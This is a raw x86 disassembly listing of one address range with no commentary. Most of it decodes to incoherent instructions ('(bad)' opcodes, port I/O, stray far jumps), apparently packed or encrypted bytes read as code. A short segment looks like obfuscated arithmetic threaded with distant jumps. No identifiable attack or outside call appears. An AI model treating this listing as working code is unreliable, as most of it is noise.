  41a355:	cmp    esi,DWORD PTR [ecx]
  41a357:	push   edi
  41a358:	in     al,dx
  41a359:	loopne 0x41a3ca
  41a35b:	adc    al,0xec
  41a35d:	test   DWORD PTR [ebx-0x31],esp
  41a360:	mov    ch,0xe0
  41a362:	xchg   ebx,eax
  41a363:	addr16 push ebx
  41a365:	jbe    0x41a366
  41a367:	xchg   edx,eax
  41a368:	xchg   edi,eax
  41a369:	push   esi
  41a36a:	(bad)  
  41a36b:	lock mul BYTE PTR [ebx+0x5ac220f]
  41a372:	inc    ebx
  41a373:	mov    eax,0xf2b2fd14
  41a378:	cwde   
  41a379:	push   ss
  41a37a:	sbb    ch,BYTE PTR [ebx]
  41a37c:	jle    0x41a356
  41a37e:	mov    ebx,0x3e4bb689
  41a383:	repz loop 0x41a354
  41a386:	pusha  
  41a387:	sahf   
  41a388:	data16 mov BYTE PTR [ebp+edx*8+0x39],ah
  41a38d:	jns    0x41a3eb
  41a38f:	iret   
  41a390:	fdivr  QWORD PTR [esi+0x7047e734]
  41a396:	jae    0x41a371
  41a398:	(bad)  
  41a399:	outs   dx,BYTE PTR ds:[esi]
  41a39a:	jo     0x41a324
  41a39c:	leave  
  41a39d:	inc    esi
  41a39e:	inc    ebx
  41a39f:	addr16 mul ecx
  41a3a2:	or     BYTE PTR [ebx+0x71fb7764],0xff
  41a3a9:	pushf  
  41a3aa:	xchg   BYTE PTR [eax],dh
  41a3ac:	push   esi
  41a3ad:	shl    DWORD PTR ds:0x2e2c7d09,0x72
  41a3b4:	cdq    
  41a3b5:	sub    dl,BYTE PTR [ebx+0x6f]
  41a3b8:	repz jae 0x41a3b6
  41a3bb:	pop    edx
  41a3bc:	sub    BYTE PTR [ebx],bh
  41a3be:	shl    BYTE PTR [edi+ecx*2-0x448414b9],0x55
  41a3c6:	sub    eax,0x14c88f19
  41a3cb:	mov    esi,0x55dc6f65
  41a3d0:	xor    eax,DWORD PTR [ecx-0x198c32ee]
  41a3d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3d7:	ret    0x73b7
  41a3da:	int    0x13
  41a3dc:	mov    ds:0xefe53f18,eax
  41a3e1:	dec    esi
  41a3e2:	loopne 0x41a3d0
  41a3e4:	xchg   ebp,eax
  41a3e5:	(bad)  
  41a3e6:	jp     0x41a439
  41a3e8:	and    al,0x21
  41a3ea:	push   ecx
  41a3eb:	loopne 0x41a3f7
  41a3ed:	iret   
  41a3ee:	aaa    
  41a3ef:	pop    es
  41a3f0:	loope  0x41a3e6
  41a3f2:	pop    edx
  41a3f3:	mov    edi,0x308db8eb
  41a3f8:	icebp  
  41a3f9:	mov    ch,0xe6
  41a3fb:	stos   BYTE PTR es:[edi],al
  41a3fc:	jae    0x41a405
  41a3fe:	test   ch,al
  41a400:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41a402:	(bad)  
  41a403:	inc    edx
  41a404:	or     al,0x98
  41a406:	cmp    BYTE PTR [eax+ebx*4-0x6e],dl
  41a40a:	ss scas al,BYTE PTR es:[edi]
  41a40c:	into   
  41a40d:	ds ss fwait
  41a410:	push   eax
  41a411:	push   edi
  41a412:	dec    edi
  41a413:	lds    esp,FWORD PTR [eax-0x4e]
  41a416:	outs   dx,BYTE PTR ds:[esi]
  41a417:	hlt    
  41a418:	sub    DWORD PTR [edi],0x28
  41a41b:	jnp    0x41a3f2
  41a41d:	fiadd  DWORD PTR [edx]
  41a41f:	inc    ebp
  41a420:	fisttp WORD PTR [edi-0xdbc3e60]
  41a426:	mov    cl,0xd
  41a428:	xor    ebx,DWORD PTR [edi]
  41a42a:	dec    edx
  41a42b:	xchg   bl,cl
  41a42d:	pop    esi
  41a42e:	cmp    DWORD PTR [eax-0x427f3590],ecx
  41a434:	popf   
  41a435:	and    al,0x4e
  41a437:	dec    edx
  41a438:	mov    eax,0x378a2c5e
  41a43d:	test   eax,0xf586e8e7
  41a442:	or     DWORD PTR [ebp-0x4ba4d079],ebp
  41a448:	mov    dl,0x15
  41a44a:	push   esp
  41a44b:	mov    bl,0x7f
  41a44d:	(bad)  
  41a44e:	dec    eax
  41a44f:	scas   eax,DWORD PTR es:[edi]
  41a450:	nop
  41a451:	dec    ebx
  41a452:	add    DWORD PTR [eax],0xffffffd8
  41a455:	mov    bl,al
  41a457:	sahf   
  41a458:	iret   
  41a459:	js     0x41a430
  41a45b:	(bad)  [ebx]
  41a45d:	dec    ecx
  41a45e:	mov    edi,0xc26dcb6e
  41a463:	arpl   cx,dx
  41a465:	ss es dec ebp
  41a468:	imul   bh
  41a46a:	pop    edx
  41a46b:	aad    0x13
  41a46d:	lods   eax,DWORD PTR ds:[esi]
  41a46e:	adc    BYTE PTR [edx],cl
  41a470:	pop    ds
  41a471:	jle    0x41a4f2
  41a473:	data16 fdivr QWORD PTR [ebp+0x55]
  41a477:	or     al,dl
  41a479:	jnp    0x41a4e9
  41a47b:	fs and cl,0x9
  41a47f:	lahf   
  41a480:	push   ecx
  41a481:	mov    esp,fs
  41a483:	out    dx,eax
  41a484:	pop    ss
  41a485:	pop    ebx
  41a486:	test   bh,al
  41a488:	or     esp,esp
  41a48a:	retf   0xab27
  41a48d:	fstp   QWORD PTR [edx+0x32]
  41a490:	pushf  
  41a491:	inc    edi
  41a492:	int    0x6
  41a494:	fwait
  41a495:	mov    ds:0xa8ca4717,al
  41a49a:	scas   eax,DWORD PTR es:[edi]
  41a49b:	push   edx
  41a49c:	jp     0x41a50b
  41a49e:	xchg   edx,eax
  41a49f:	xor    al,0x6
  41a4a1:	mov    eax,ds:0x561e471c
  41a4a6:	enter  0x99d,0x6b
  41a4aa:	ja     0x41a471
  41a4ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a4ad:	es aam 0x5c
  41a4b0:	test   al,0x5a
  41a4b2:	repz (bad) 
  41a4b4:	out    0x32,eax
  41a4b6:	push   eax
  41a4b7:	fwait
  41a4b8:	bndldx (bad),[eax-0x69]
  41a4bc:	pop    ds
  41a4bd:	mov    dl,0x8e
  41a4bf:	push   ebx
  41a4c0:	or     BYTE PTR [esi+0x3b],bl
  41a4c3:	test   eax,0x2e3376a
  41a4c8:	or     BYTE PTR ds:0xb76d4876,al
  41a4ce:	pop    ebp
  41a4cf:	sahf   
  41a4d0:	xor    eax,0x6a5772af
  41a4d5:	hlt    
  41a4d6:	scas   eax,DWORD PTR es:[edi]
  41a4d7:	sbb    dl,BYTE PTR gs:0x8d959343
  41a4de:	pop    edi
  41a4df:	rcr    BYTE PTR [edx],1
  41a4e1:	(bad)  
  41a4e2:	out    0xdd,al
  41a4e4:	(bad)  
  41a4e5:	mov    edx,0x8744af4d
  41a4ea:	mov    ds:0x99054d3c,al
  41a4ef:	sub    edi,DWORD PTR [ebp-0x66]
  41a4f2:	scas   al,BYTE PTR es:[edi]
  41a4f3:	add    eax,0x643612b5
  41a4f8:	xor    eax,0x9030836a
  41a4fd:	add    al,0x56
  41a4ff:	and    DWORD PTR [ecx+0x25201ce4],ebp
  41a505:	jle    0x41a55c
  41a507:	dec    ecx
  41a508:	dec    esp
  41a509:	push   0xea9270b0
  41a50e:	imul   BYTE PTR [ebx-0x36032049]
  41a514:	mov    al,ah
  41a516:	aad    0xff
  41a518:	(bad)
  41a51b:	mov    edi,0x114420a
  41a520:	push   es
  41a521:	mov    dl,0x17
  41a523:	inc    edx
  41a524:	inc    esi
  41a525:	fisub  WORD PTR [eax+edi*8]
  41a528:	ss sub al,0x73
  41a52b:	mov    ah,ch
  41a52d:	and    al,0xc7
  41a52f:	ja     0x41a52f
  41a531:	fsub   DWORD PTR [esi-0x4c]
  41a534:	mov    ecx,0xf80258c0
  41a539:	mov    edx,0x24d35b41
  41a53e:	loopne 0x41a4cd
  41a540:	es mov esp,0x14336d69
  41a546:	sahf   
  41a547:	cmp    BYTE PTR [eax+0x3a5164a2],al
  41a54d:	scas   eax,DWORD PTR es:[edi]
  41a54e:	cmp    eax,0x99726a4a
  41a553:	sub    al,0x7f
  41a555:	mov    ecx,DWORD PTR [ecx]
  41a557:	or     ebp,ebx
  41a559:	jne    0x41a593
  41a55b:	jmp    0x17a5:0x1b3532c8
  41a562:	ret    
  41a563:	scas   eax,DWORD PTR es:[edi]
  41a564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a565:	mov    ah,0xba
  41a567:	xor    eax,0xee19522c
  41a56c:	mov    dl,al
  41a56e:	ja     0x41a527
  41a570:	popa   
  41a571:	mov    bh,0x8a
  41a573:	jb     0x41a52b
  41a575:	mov    eax,ds:0x307ce96c
  41a57a:	mov    esp,?
  41a57c:	or     ah,dh
  41a57e:	xor    al,0x20
  41a580:	out    0x61,al
  41a582:	test   eax,0xa5581d37
  41a587:	add    BYTE PTR [edx],0xed
  41a58a:	add    edx,DWORD PTR [esi]
  41a58c:	xlat   BYTE PTR ds:[ebx]
  41a58d:	iret   
  41a58e:	jae    0x41a56d
  41a590:	loop   0x41a600
  41a592:	jmp    0x41a53a
  41a594:	push   esi
  41a595:	aam    0x14
  41a597:	cmp    esi,ebp
  41a599:	(bad)  
  41a59a:	shl    DWORD PTR [eax],1
  41a59c:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a59e:	mov    gs,WORD PTR [ebx-0x68]
  41a5a1:	and    BYTE PTR [esi+0x409dd8a0],ch
  41a5a7:	loop   0x41a5e9
  41a5a9:	pop    es
  41a5aa:	ret    
  41a5ab:	fdivr  DWORD PTR [eax+eax*2]
  41a5ae:	xchg   edi,eax
  41a5af:	inc    eax
  41a5b0:	mov    bl,BYTE PTR [edi]
  41a5b2:	push   esi
  41a5b3:	and    edx,DWORD PTR [eax]
  41a5b5:	aam    0xbf
  41a5b7:	pop    ebx
  41a5b8:	lock xchg BYTE PTR [ecx+esi*8+0x7d27a43],bl
  41a5c0:	push   es
  41a5c1:	pop    eax
  41a5c2:	pop    esp
  41a5c3:	mov    cl,0x11
  41a5c5:	sbb    DWORD PTR [esi+0x3f],0xbed4b5de
  41a5cc:	sub    ebx,DWORD PTR ds:0x2020da0b
  41a5d2:	in     al,dx
  41a5d3:	pop    eax
  41a5d4:	mov    ch,0xb5
  41a5d6:	xchg   esi,eax
  41a5d7:	shl    BYTE PTR [edx+0x3017746b],1
  41a5dd:	sub    al,BYTE PTR [edi+0x56]
  41a5e0:	rol    BYTE PTR [ebp+0x6ab5d9f7],1
  41a5e6:	jge    0x41a5d3
  41a5e8:	scas   al,BYTE PTR es:[edi]
  41a5e9:	mov    ebp,0xc0467a4e
  41a5ee:	lea    ecx,es:[ecx+0x5d]
  41a5f2:	mov    eax,0x3e7eb206
  41a5f7:	jp     0x41a643
  41a5f9:	sub    eax,0xb4c2ced2
  41a5fe:	(bad)  
  41a5ff:	mov    esp,0xaf32e58d
  41a604:	(bad)  
  41a605:	dec    eax
  41a606:	mov    edx,0x489a00a4
  41a60b:	psubw  mm2,mm0
  41a60e:	in     al,0x9b
  41a610:	xlat   BYTE PTR ds:[ebx]
  41a611:	cs add eax,0xec04aefe
  41a617:	push   ebx
  41a618:	push   ds
  41a619:	ss add dl,cl
  41a61c:	inc    ebx
  41a61d:	and    DWORD PTR [ecx+0x5139ec1d],0x49
  41a624:	addr16 (bad) 
  41a626:	mov    ah,0x2f
  41a628:	xchg   edx,eax
  41a629:	(bad)  
  41a62a:	sahf   
  41a62b:	shl    DWORD PTR [edi+0x31a9dab6],0x78
  41a632:	push   ebp
  41a633:	pop    eax
  41a634:	pusha  
  41a635:	in     eax,0xc0
  41a637:	fmul   DWORD PTR [esi+0x15fa05cf]
  41a63d:	scas   al,BYTE PTR es:[edi]
  41a63e:	dec    ebp
  41a63f:	je     0x41a66f
  41a641:	iret   
  41a642:	int    0xae
  41a644:	adc    bh,cl
  41a646:	mov    edi,0x7fadd69f
  41a64b:	jp     0x41a60b
  41a64d:	lods   al,BYTE PTR cs:[esi]
  41a64f:	push   esi
  41a650:	das    
  41a651:	inc    esi
  41a652:	pop    ds
  41a653:	cmp    ch,BYTE PTR [ecx-0x13d7244f]
  41a659:	jmp    0x41a61c
  41a65b:	adc    ecx,0x16
  41a65e:	stos   BYTE PTR es:[edi],al
  41a65f:	jp     0x41a622
  41a661:	retf   0xc4f5
  41a664:	push   0x7f
  41a666:	dec    esp
  41a667:	mov    bl,0x1e
  41a669:	sub    BYTE PTR [edi],ch
  41a66b:	sbb    esi,ebp
  41a66d:	fcmovnb st,st(7)
  41a66f:	leave  
  41a670:	xor    eax,0x9bb89ed6
  41a675:	xor    ch,dl
  41a677:	jns    0x41a6b0
  41a679:	pop    ds
  41a67a:	mov    cs,WORD PTR [eax-0x14]
  41a67d:	push   0xf2e5bb50
  41a682:	add    DWORD PTR [esi],0x5a
  41a685:	das    
  41a686:	std    
  41a687:	arpl   WORD PTR [ebx],di
  41a689:	sahf   
  41a68a:	inc    ebx
  41a68b:	lock inc esp
  41a68d:	mov    ecx,0x84cef7d0
  41a692:	sub    ebx,DWORD PTR [edx+0x19766d89]
  41a698:	fidivr WORD PTR [edi-0x5f7629e7]
  41a69e:	jns    0x41a6de
  41a6a0:	cs push ds
  41a6a2:	push   ecx
  41a6a3:	pop    ss
  41a6a4:	rcr    BYTE PTR [edx],cl
  41a6a6:	push   0xa576dd98
  41a6ab:	jle    0x41a65e
  41a6ad:	jg     0x41a6c1
  41a6af:	push   ds
  41a6b0:	aad    0x68
  41a6b2:	push   ebx
  41a6b3:	aam    0xd0
  41a6b5:	fisttp DWORD PTR [ebp+0x1621eb9f]
  41a6bb:	sub    dh,bh
  41a6bd:	pop    ss
  41a6be:	adc    DWORD PTR [ecx+0x5b],0xff9241e7
  41a6c5:	jmp    0xef3b:0x5c416ab2
  41a6cc:	or     eax,0x98bde76d
  41a6d1:	dec    ebp
  41a6d2:	inc    edx
  41a6d3:	fadd   QWORD PTR [ebx]
  41a6d5:	sbb    ecx,DWORD PTR [esi+0x785b49b8]
  41a6db:	cmp    eax,0xe4d00f8f
  41a6e0:	pop    edx
  41a6e1:	adc    cl,bl
  41a6e3:	push   cs
  41a6e4:	xchg   ecx,eax
  41a6e5:	cdq    
  41a6e6:	pop    eax
  41a6e7:	(bad)  
  41a6e8:	dec    esi
  41a6e9:	dec    edi
  41a6ea:	pushf  
  41a6eb:	cld    
  41a6ec:	fcom   DWORD PTR [edi]
  41a6ee:	cli    
  41a6ef:	mov    ebp,0x60ddb565
  41a6f4:	fisttp DWORD PTR [esi]
  41a6f6:	sti    
  41a6f7:	ror    bh,0x2c
  41a6fa:	mov    bh,0x3b
  41a6fc:	test   DWORD PTR [ebp+edi*2-0x7d22c2be],edx
  41a703:	rcr    BYTE PTR ds:0x4584f973,0xe4
  41a70a:	pop    edx
  41a70b:	mov    WORD PTR [ecx+0x10],ds
  41a70e:	outs   dx,DWORD PTR ds:[esi]
  41a70f:	jno    0x41a6d0
  41a711:	inc    ecx
  41a712:	fld    DWORD PTR [ebp+0x11]
  41a715:	ins    BYTE PTR es:[edi],dx
  41a716:	and    al,0xdf
  41a718:	je     0x41a6fa
  41a71a:	add    edx,DWORD PTR [esi+0x73e6bda8]
  41a720:	imul   esp,DWORD PTR [edi],0xef83aa08
  41a726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a727:	outs   dx,DWORD PTR ds:[esi]
  41a728:	add    eax,0x63c0fe64
  41a72d:	inc    ecx
  41a72e:	xor    al,0xb0
  41a730:	mov    ebx,0x7df9cc71
  41a735:	popf   
  41a736:	mov    ebp,0x9d47b559
  41a73b:	sub    bh,BYTE PTR ds:0xde344dd5
  41a741:	(bad)  
  41a743:	js     0x41a7a7
  41a745:	adc    dl,ch
  41a747:	mov    al,0x89
  41a749:	or     bl,BYTE PTR [eax-0x65]
  41a74c:	inc    ebx
  41a74d:	out    dx,eax
  41a74e:	je     0x41a77f
  41a750:	jge    0x41a76a
  41a752:	bound  esi,QWORD PTR [eax+0xb]
  41a755:	mov    al,ds:0x55966c87
  41a75a:	ds mov edi,0x195c4079
  41a760:	dec    eax
  41a761:	or     DWORD PTR [eax],eax
  41a763:	(bad)  
  41a764:	scas   al,BYTE PTR es:[edi]
  41a765:	in     al,dx
  41a766:	adc    DWORD PTR [ecx+0x6848acb0],ebx
  41a76c:	xor    DWORD PTR [ebx],0x39
  41a76f:	mov    ebx,0xb2b4c6fd
  41a774:	inc    esi
  41a775:	std    
  41a776:	cs push ecx
  41a778:	mov    edi,0x1a4eb61b
  41a77d:	cmp    al,0x5b
  41a77f:	or     DWORD PTR [edx],ecx
  41a781:	inc    edi
  41a782:	or     edx,DWORD PTR [ebx+0x6e]
  41a785:	cdq    
  41a786:	xchg   edi,eax
  41a787:	pop    edi
  41a788:	adc    eax,0xbe23650e
  41a78d:	mov    bh,0x19
  41a78f:	add    BYTE PTR [eax+0x119b392a],bh
  41a795:	lods   al,BYTE PTR ds:[esi]
  41a796:	xchg   dl,bh
  41a798:	fcomp  DWORD PTR [eax+0x3a67607a]
  41a79e:	outs   dx,DWORD PTR ds:[esi]
  41a79f:	test   al,0xfd
  41a7a1:	(bad)  
  41a7a2:	bound  eax,QWORD PTR [ecx-0x3a40be8a]
  41a7a8:	xchg   ecx,eax
  41a7a9:	adc    al,0x73
  41a7ab:	pushf  
  41a7ac:	jns    0x41a7c5
  41a7ae:	cmp    WORD PTR [eax-0x5c],cx
  41a7b2:	sbb    DWORD PTR [ebp+0x46],eax
  41a7b5:	rcr    DWORD PTR [edx],0xec
  41a7b8:	sbb    edx,DWORD PTR [eax+ebx*4+0x2e]
  41a7bc:	mov    ah,0xb4
  41a7be:	xor    BYTE PTR [eax-0x744b1aa4],dl
  41a7c4:	push   ebp
  41a7c5:	in     al,dx
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2+0x7971a82e]
  41a82d:	mov    eax,ds:0x7c7d1390
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	int3   
  41a837:	or     al,0xf7
  41a839:	popa   
  41a83a:	fistp  DWORD PTR [esi-0x6d]
  41a83d:	jecxz  0x41a8b3
  41a83f:	loope  0x41a86e
  41a841:	push   es
  41a842:	fmul   QWORD PTR [eax+0x2f]
  41a845:	mov    bl,0xee
  41a847:	test   al,0x16
  41a849:	or     al,0xe9
  41a84b:	mov    ch,0xf8
  41a84d:	dec    edi
  41a84e:	jae    0x41a855
  41a850:	inc    esp
  41a851:	xor    esi,DWORD PTR [ebp-0xa]
  41a854:	and    edx,eax
  41a856:	mov    fs,WORD PTR [ecx-0x43]
  41a859:	cmp    eax,0x66b3349f
  41a85e:	xchg   ecx,eax
  41a85f:	inc    edi
  41a860:	jecxz  0x41a856
  41a862:	(bad)  
  41a863:	mov    ebp,0x6cf1bc31
  41a868:	dec    eax
  41a869:	clc    
  41a86a:	mov    ebx,DWORD PTR [esi]
  41a86c:	test   DWORD PTR [ebx],edx
  41a86e:	rol    DWORD PTR [ebp+eiz*8-0x77f991dc],0xde
  41a876:	cmp    eax,0x19175e18
  41a87b:	push   es
  41a87c:	pop    edx
  41a87d:	(bad)
  41a880:	and    al,0x29
  41a882:	push   0xffffffae
  41a884:	fcmovb st,st(4)
  41a886:	int3   
  41a887:	dec    ecx
  41a888:	jae    0x41a8ae
  41a88a:	cwde   
  41a88b:	dec    ebx
  41a88c:	add    DWORD PTR [edx-0x710c8f77],0xffffffe8
  41a893:	sub    al,0xdf
  41a895:	(bad)  
  41a896:	sbb    DWORD PTR [eax+0x19dc94c],ecx
  41a89c:	aaa    
  41a89d:	adc    ah,BYTE PTR [edx+0x3e]
  41a8a0:	lea    eax,[ebx]
  41a8a2:	dec    ecx
  41a8a3:	xor    al,0x75
  41a8a5:	in     eax,dx
  41a8a6:	mov    bh,0x80
  41a8a8:	addr16 xchg ecx,eax
  41a8aa:	(bad)  
  41a8ac:	jmp    DWORD PTR [esi]
  41a8ae:	push   eax
  41a8af:	add    eax,0x7257c90b
  41a8b4:	mov    bl,0x1c
  41a8b6:	pusha  
  41a8b7:	xor    DWORD PTR [edi],ecx
  41a8b9:	jns    0x41a8d4
  41a8bb:	es jle 0x41a908
  41a8be:	cmc    
  41a8bf:	sub    eax,0xf9771f55
  41a8c4:	inc    ebp
  41a8c5:	xor    DWORD PTR [ebp+0x109bf72c],edi
  41a8cb:	fdiv   st,st(1)
  41a8cd:	dec    edi
  41a8ce:	jbe    0x41a915
  41a8d0:	lea    edx,[edi+esi*4+0x2]
  41a8d4:	fucomip st,st(1)
  41a8d6:	cwde   
  41a8d7:	xchg   BYTE PTR [ebx-0x44],ah
  41a8da:	xor    esi,DWORD PTR [eax+0x2b]
  41a8dd:	outs   dx,DWORD PTR ds:[si]
  41a8df:	jp     0x41a88d
  41a8e1:	mov    esi,0x8b9cc8bd
  41a8e6:	stc    
  41a8e7:	add    eax,0x30332333
  41a8ec:	sub    al,0x6a
  41a8ee:	jno    0x41a8d2
  41a8f0:	fld    QWORD PTR [ebx-0x4a]
  41a8f3:	jbe    0x41a96f
  41a8f5:	or     ecx,DWORD PTR [ebp+0x637c03e1]
  41a8fb:	sbb    al,0x7
  41a8fd:	nop
  41a8fe:	sbb    ecx,DWORD PTR [esi+eax*8]
  41a901:	mul    DWORD PTR [esi-0x3c]
  41a904:	mov    dl,BYTE PTR [eax+ebp*2+0x52]
  41a908:	jg     0x41a90f
  41a90a:	repnz stos DWORD PTR es:[edi],eax
  41a90c:	sbb    BYTE PTR [ebx-0x18],ch
  41a90f:	pop    ebp
  41a910:	xor    ebx,DWORD PTR [ebx]
  41a912:	sbb    ebx,esp
  41a914:	dec    edx
  41a915:	fbld   TBYTE PTR [edx+0x6f]
  41a918:	adc    al,0x39
  41a91a:	mov    al,ds:0x59708bfe
  41a91f:	inc    ebx
  41a920:	jg     0x41a980
  41a922:	mov    ebp,0xd33c03eb
  41a927:	adc    eax,0x43f2974a
  41a92c:	fnstcw WORD PTR [ebp+0x599ab7a4]
  41a932:	jne    0x41a948
  41a934:	jmp    0x1ebce40c
  41a939:	inc    edi
  41a93a:	jge    0x41a942
  41a93c:	adc    eax,0x1e37cc98
  41a941:	out    0x9e,eax
  41a943:	shr    DWORD PTR [eax-0x33a6d760],cl
  41a949:	pop    edi
  41a94a:	xchg   BYTE PTR [edx],cl
  41a94c:	loop   0x41a90b
  41a94e:	pop    edi
  41a94f:	cmp    BYTE PTR [ecx-0x3d45b7df],al
  41a955:	ds das 
  41a957:	mov    edi,0xee6516e3
  41a95c:	cmp    esi,esi
  41a95e:	les    ebp,FWORD PTR [ecx-0x5b093569]
  41a964:	xlat   BYTE PTR ds:[ebx]
  41a965:	add    ch,BYTE PTR [esi-0x72]
  41a968:	jle    0x41a8ee
  41a96a:	cmc    
  41a96b:	pushw  0xff90
  41a96e:	mov    al,ds:0x5f0e4536
  41a973:	jl     0x41a9d0
  41a975:	leave  
  41a976:	and    al,0xfe
  41a978:	pushf  
  41a979:	cdq    
  41a97a:	mov    DWORD PTR ds:0x574cc6cc,0x8be819d
  41a984:	add    BYTE PTR [esi+0x1e],0x4f
  41a988:	and    al,0xb2
  41a98a:	jmp    0x330002c8
  41a98f:	jns    0x41a9d3
  41a991:	dec    edi
  41a992:	sbb    eax,0x91443b1c
  41a997:	std    
  41a998:	cmp    DWORD PTR [edx+0x5206219c],edi
  41a99e:	jno    0x41a984
  41a9a0:	(bad)  
  41a9a1:	data16 hlt 
  41a9a3:	mov    ds:0x2e710e89,eax
  41a9a8:	add    DWORD PTR [edx],ebp
  41a9aa:	dec    ebx
  41a9ab:	cld    
  41a9ac:	or     al,BYTE PTR [ebx-0x5f]
  41a9af:	pushf  
  41a9b0:	adc    al,0xa6
  41a9b2:	dec    eax
  41a9b3:	mul    BYTE PTR [ebp+0x1b]
  41a9b6:	jl     0x41a94b
  41a9b8:	sub    al,0x26
  41a9ba:	ins    BYTE PTR es:[edi],dx
  41a9bb:	mov    bh,0x8f
  41a9bd:	pop    edi
  41a9be:	jle    0x41a951
  41a9c0:	lock fs mov edx,0x5b5a3d85
  41a9c7:	fmul   QWORD PTR [eax+ebp*2+0x761f65f2]
  41a9ce:	sub    DWORD PTR [eax],ebp
  41a9d0:	pop    ss
  41a9d1:	push   0xb47da042
  41a9d6:	and    eax,DWORD PTR [ecx]
  41a9d8:	jno    0x41a9e5
  41a9da:	xchg   edi,eax
  41a9db:	(bad)  
  41a9dc:	xchg   ebp,eax
  41a9dd:	push   ebx
  41a9de:	jp     0x41aa4b
  41a9e0:	repz icebp 
  41a9e2:	xchg   esi,eax
  41a9e3:	scas   al,BYTE PTR es:[edi]
  41a9e4:	push   ecx
  41a9e5:	(bad)  
  41a9e6:	mov    fs:0x437c0cc2,al
  41a9ec:	xchg   edi,eax
  41a9ed:	push   0xab019310
  41a9f2:	dec    edx
  41a9f3:	xchg   esi,eax
  41a9f4:	add    ebx,DWORD PTR [ebx-0x44]
  41a9f7:	rol    DWORD PTR [esi],1
  41a9f9:	xchg   DWORD PTR [eax-0x56189680],edx
  41a9ff:	and    eax,edx
  41aa01:	cld    
  41aa02:	dec    edi
  41aa03:	aam    0x3b
  41aa05:	inc    edi
  41aa06:	popa   
  41aa07:	enter  0xa1ca,0x3e
  41aa0b:	sbb    eax,0xc0b05b08
  41aa10:	dec    ecx
  41aa11:	aaa    
  41aa12:	out    0x13,eax
  41aa14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa15:	es inc eax
  41aa17:	jl     0x41aa60
  41aa19:	pop    ecx
  41aa1a:	cmp    BYTE PTR [ecx+0x4850f0eb],dl
  41aa20:	jns    0x41aa7b
  41aa22:	retf   
  41aa23:	jo     0x41aa27
  41aa25:	jmp    0x41aa70
  41aa27:	mov    BYTE PTR [edx],ch
  41aa29:	pop    ebp
  41aa2a:	popa   
  41aa2b:	jle    0x41aa72
  41aa2d:	jo     0x41aa8d
  41aa2f:	push   0xffffffbe
  41aa31:	jmp    0x41aaaf
  41aa33:	cdq    
  41aa34:	mov    bh,cl
  41aa36:	sub    BYTE PTR [edi-0x1aa92eec],dh
  41aa3c:	outs   dx,DWORD PTR ds:[esi]
  41aa3d:	add    ch,BYTE PTR [ebx+0x44e6a6a0]
  41aa43:	mov    eax,ds:0x4090f4d6
  41aa48:	lahf   
  41aa49:	sbb    dl,BYTE PTR [edi+edi*8-0x1ead9081]
  41aa50:	mov    ss,eax
  41aa52:	xor    ebx,DWORD PTR [eax-0x703d1700]
  41aa58:	ret    0x444b
  41aa5b:	sub    bh,BYTE PTR [ebp+0x66]
  41aa5e:	dec    edi
  41aa5f:	jnp    0x41aa96
  41aa61:	inc    ebp
  41aa62:	(bad)  
  41aa63:	es adc ebx,0xffffffc7
  41aa67:	mov    edi,0xd2ea2076
  41aa6c:	imul   eax,esp,0xbf9aa8c
  41aa72:	out    0x95,al
  41aa74:	jl     0x41aaf1
  41aa76:	sub    BYTE PTR [edx+ebp*8],ch
  41aa79:	sub    esp,ebx
  41aa7b:	lods   al,BYTE PTR ds:[esi]
  41aa7c:	inc    eax
  41aa7d:	popf   
  41aa7e:	xchg   BYTE PTR [ecx-0x5c8062a2],dl
  41aa84:	adc    BYTE PTR [esi-0x5f],ah
  41aa87:	enter  0x7547,0x76
  41aa8b:	hlt    
  41aa8c:	add    esp,DWORD PTR [edi]
  41aa8e:	out    dx,eax
  41aa8f:	inc    edx
  41aa90:	add    DWORD PTR [eax-0x61],edi
  41aa93:	mov    ecx,0x99fa7503
  41aa98:	in     eax,0x9e
  41aa9a:	into   
  41aa9b:	jno    0x41aa4b
  41aa9d:	repz sbb dh,BYTE PTR [ecx-0x62]
  41aaa1:	pop    edx
  41aaa2:	stc    
  41aaa3:	adc    dh,dh
  41aaa5:	mov    al,0x7c
  41aaa7:	xchg   BYTE PTR ds:0x52aca9d0,al
  41aaad:	or     ebp,ecx
  41aaaf:	repz loope 0x41aa33
  41aab2:	dec    ebx
  41aab3:	(bad)  
  41aab4:	push   esi
  41aab5:	js     0x41ab36
  41aab7:	sbb    ecx,DWORD PTR [edi-0x68]
  41aaba:	mov    bl,0xfb
  41aabc:	pop    es
  41aabd:	jbe    0x41ab1f
  41aabf:	cmp    BYTE PTR [edx],bh
  41aac1:	stos   BYTE PTR es:[edi],al
  41aac2:	out    0x42,eax
